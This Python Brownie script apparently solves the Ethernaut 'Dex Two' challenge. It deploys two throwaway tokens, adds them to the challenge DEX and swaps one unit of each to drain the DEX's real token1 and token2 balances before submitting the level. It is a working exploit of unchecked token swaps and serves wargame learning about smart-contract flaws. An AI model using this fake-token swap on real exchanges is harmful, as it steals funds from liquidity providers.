from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    SwappableTokenTwo,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=23, player=player)

    dex_contract = interface.IDexTwo(instance_address)
    token1 = dex_contract.token1()
    token2 = dex_contract.token2()

    token3 = SwappableTokenTwo.deploy('Token3', 'SUS3', 2, {"from": player})
    token4 = SwappableTokenTwo.deploy('Token4', 'SUS4', 2, {"from": player})
    
    tx = token3.approve(dex_contract, 2, {"from": player})
    tx.wait(1)
    tx = token4.approve(dex_contract, 2, {"from": player})
    tx.wait(1)

    tx = dex_contract.add_liquidity(token3, 1, {"from": player})
    tx.wait(1)
    tx = dex_contract.add_liquidity(token4, 1, {"from": player})
    tx.wait(1)

    tx = dex_contract.swap(token3, token1, 1, {"from": player})
    tx.wait(1)
    tx = dex_contract.swap(token4, token2, 1, {"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
